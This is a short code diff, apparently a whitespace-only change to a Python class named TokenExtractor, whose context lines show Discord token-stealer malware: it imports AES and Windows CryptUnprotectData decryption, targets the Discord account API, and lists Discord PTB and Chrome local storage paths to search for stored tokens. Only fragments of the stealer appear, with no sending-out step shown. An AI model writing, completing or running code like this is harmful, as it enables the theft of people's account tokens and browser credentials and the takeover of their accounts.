@@ -6,6 +6,7 @@ from Crypto.Cipher import AES
 from win32crypt import CryptUnprotectData
 import requests  
 
+
 class TokenExtractor:
     def __init__(self):
         self.base_url = "https://discord.com/api/v9/users/@me"
@@ -22,6 +23,7 @@ class TokenExtractor:
             'Discord PTB': self.roaming + '\\discordptb\\Local Storage\\leveldb\\',
             'Chrome': self.appdata + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
         }
+
 
         for name, path in paths.items():
             if not os.path.exists(path):
